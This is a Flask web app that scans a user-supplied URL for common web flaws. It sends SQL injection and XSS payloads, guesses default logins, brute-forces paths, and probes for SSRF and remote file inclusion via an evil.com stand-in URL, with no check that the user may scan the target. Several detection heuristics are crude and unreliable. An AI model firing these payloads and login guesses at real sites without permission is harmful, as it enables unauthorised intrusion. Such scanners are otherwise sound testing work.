from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
from urllib.parse import urljoin, urlparse
import re
import socket
import ssl

app = Flask(__name__, template_folder='.', static_folder='static')
CORS(app)

@app.errorhandler(Exception)
def handle_exception(e):
    return jsonify({"error": str(e)}), 500

@app.errorhandler(400)
def handle_bad_request(e):
    return jsonify({"error": "Bad request"}), 400

@app.errorhandler(404)
def handle_not_found(e):
    # Return JSON for missing endpoints so frontend fetches receive JSON errors
    return jsonify({"error": "404 Not Found", "message": str(e)}), 404

# Combined vulnerability checks
SQL_PAYLOADS = ['1=1', "' OR '1'='1", "' AND 1=0--"]
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">', '<svg onload=alert(1)>']
COMMON_CREDENTIALS = [('admin', 'admin'), ('root', 'root'), ('user', 'password'), ('guest', 'guest'), ('test', 'test123')]
WORDLIST = ["admin", "backup", "config", "login", "test", "users", "uploads"]

def initialize_results():
    return []

def perform_scan(target_url):
    results = initialize_results()
    nikto_checks(target_url, results)
    check_sql_injection_and_xss(target_url, results)
    check_broken_authentication(target_url, results)
    check_broken_access_control(target_url, results)
    check_csrf(target_url, results)
    check_security_misconfiguration(target_url, results)
    check_sensitive_data_exposure(target_url, results)
    check_ssrf(target_url, results)
    check_cryptographic_failures(target_url, results)
    check_rfi(target_url, results)
    return results

def check_sql_injection_and_xss(url, results):
    for payload in SQL_PAYLOADS:
        test_url = urljoin(url, f"?input={payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                results.append(f"[+] SQL Injection detected with payload: {payload}")
        except requests.HTTPError as e:
            results.append(f"[-] Error checking SQL Injection: {str(e)}")

    for payload in XSS_PAYLOADS:
        test_url = urljoin(url, f"?input={payload}")
        try:
            response = requests.get(test_url, timeout=5)
            if payload in response.text:
                results.append(f"[+] XSS vulnerability detected with payload: {payload}")
        except requests.HTTPError as e:
            results.append(f"[-] Error checking XSS: {str(e)}")

def check_broken_authentication(url, results):
    session = requests.Session()
    for username, password in COMMON_CREDENTIALS:
        login_data = {'username': username, 'password': password}
        try:
            response = session.post(url, data=login_data, timeout=5)
            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append(f"[+] Weak authentication: {username}:{password} allows login.")
            if "PHPSESSID" in session.cookies.get_dict():
                results.append(f"[-] Session ID is predictable: {session.cookies['PHPSESSID']}")
            else:
                results.append("[+] No predictable session ID found.")

            # Check for multiple sessions
            response2 = requests.post(url, data=login_data, timeout=5)
            if response2.status_code == 200:
                results.append("[+] Multiple sessions allowed with same credentials.")
        except requests.RequestException as e:
            results.append(f"[-] Error checking authentication: {str(e)}")

def check_broken_access_control(url, results):
    restricted_page = urljoin(url, "/admin")
    try:
        response = requests.get(restricted_page, timeout=5)
        if response.status_code == 200:
            results.append("[+] Broken Access Control: Access to restricted page allowed.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Broken Access Control: {str(e)}")

def check_csrf(url, results):
    csrf_payload = {'username': 'test', 'password': 'test'}
    try:
        response = requests.post(urljoin(url, "/login"), data=csrf_payload, timeout=5)
        if "Invalid" not in response.text:
            results.append("[+] CSRF vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking CSRF: {str(e)}")

def check_security_misconfiguration(url, results):
    try:
        response = requests.get(urljoin(url, "/.env"), timeout=5)
        if response.status_code == 200:
            results.append("[+] Security Misconfiguration detected: Exposed .env file.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Security Misconfiguration: {str(e)}")

def check_sensitive_data_exposure(url, results):
    if url.startswith("http://"):
        results.append("[+] Sensitive Data Exposure detected: HTTP used instead of HTTPS.")

def check_ssrf(url, results):
    ssrf_payload = "http://127.0.0.1:8080"
    try:
        response = requests.get(urljoin(url, f"?target={ssrf_payload}"), timeout=5)
        if response.status_code == 200:
            results.append("[+] SSRF vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking SSRF: {str(e)}")

def check_cryptographic_failures(url, results):
    try:
        response = requests.get(urljoin(url, "/profile"), timeout=5)
        if "password" in response.text and "plaintext" in response.text:
            results.append("[+] Cryptographic Failure detected: Sensitive data exposed in plaintext.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking Cryptographic Failures: {str(e)}")

def check_rfi(url, results):
    rfi_payload = "http://evil.com/malicious_file"
    try:
        response = requests.get(urljoin(url, f"?file={rfi_payload}"), timeout=5)
        if response.status_code == 200:
            results.append("[+] RFI vulnerability detected.")
    except requests.RequestException as e:
        results.append(f"[-] Error checking RFI: {str(e)}")

def nikto_checks(target_url, results):
    try:
        response = requests.get(target_url)
        results.append(f"Server: {response.headers.get('Server')}")

        # Common file checks
        common_files = ["/robots.txt", "/admin/", "/config.php", "/.git/config"]
        for file in common_files:
            file_url = urljoin(target_url, file)
            file_response = requests.get(file_url)
            if file_response.status_code == 200:
                results.append(f"Found: {file}")
            elif file_response.status_code == 403:
                results.append(f"Forbidden: {file}")
            elif file_response.status_code == 404:
                results.append(f"Not Found: {file}")

        # Basic vulnerability pattern check
        if re.search(r"phpinfo\(\)", response.text, re.IGNORECASE):
            results.append("Potential vulnerability: phpinfo() found.")

        # HTTP method check
        options_response = requests.options(target_url)
        allowed_methods = options_response.headers.get("Allow")
        results.append(f"Allowed HTTP methods: {allowed_methods}")

        # SSL/TLS check
        try:
            context = ssl.create_default_context()
            with context.wrap_socket(socket.socket(), server_hostname=urlparse(target_url).netloc) as ssock:
                cert = ssock.getpeercert()
                results.append(f"Certificate: {cert}")
        except Exception as e:
            results.append(f"SSL/TLS error: {e}")

        # Directory brute force (using combined wordlist)
        for word in WORDLIST:
            test_url = urljoin(target_url, word)
            test_response = requests.get(test_url)
            if test_response.status_code == 200:
                results.append(f"Directory found: {test_url}")

    except requests.RequestException as e:
        results.append(f"Error: {e}")

@app.route("/", methods=["GET", "POST"])
def index():
    results = initialize_results()  # Initialize results here
    if request.method == "POST":
        target_url = request.form["target_url"]
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        nikto_checks(target_url, results)
        check_sql_injection_and_xss(target_url, results)
        check_broken_authentication(target_url, results)
        check_broken_access_control(target_url, results)
        check_csrf(target_url, results)
        check_security_misconfiguration(target_url, results)
        check_sensitive_data_exposure(target_url, results)
        check_ssrf(target_url, results)
        check_cryptographic_failures(target_url, results)
        check_rfi(target_url, results)
    return render_template("index.html", results=results)

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/scanner")
@app.route("/scanner/")
def scanner():
    return render_template("scanner.html")

@app.route("/scan", methods=["POST"])
def scan():
    try:
        data = request.get_json()
        target_url = data.get("url")
        if not target_url:
            return jsonify({"error": "No URL provided"}), 400
        parsed = urlparse(target_url)
        if not parsed.scheme or not parsed.netloc:
            return jsonify({"error": "Invalid URL. Please provide a full URL starting with http:// or https://"}), 400
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url
        results = perform_scan(target_url)
        return jsonify({"results": results})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True)